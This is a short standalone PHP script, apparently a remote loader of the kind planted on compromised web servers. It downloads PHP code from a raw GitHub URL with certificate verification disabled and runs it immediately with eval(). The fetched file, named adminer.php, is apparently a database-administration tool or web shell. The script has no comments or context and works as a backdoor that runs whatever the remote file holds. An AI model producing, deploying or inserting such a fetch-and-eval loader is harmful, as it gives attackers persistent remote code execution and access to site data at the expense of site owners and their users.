<?php
$url = 'https://raw.githubusercontent.com/seokerens/umum/refs/heads/main/adminer.php';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$fileContents = curl_exec($ch);
curl_close($ch);
if ($fileContents === false) {
    die('[!] Cannot Get File : https://raw.githubusercontent.com/seokerens/umum/refs/heads/main/adminer.php ');
}
eval("?>" . $fileContents);
?>
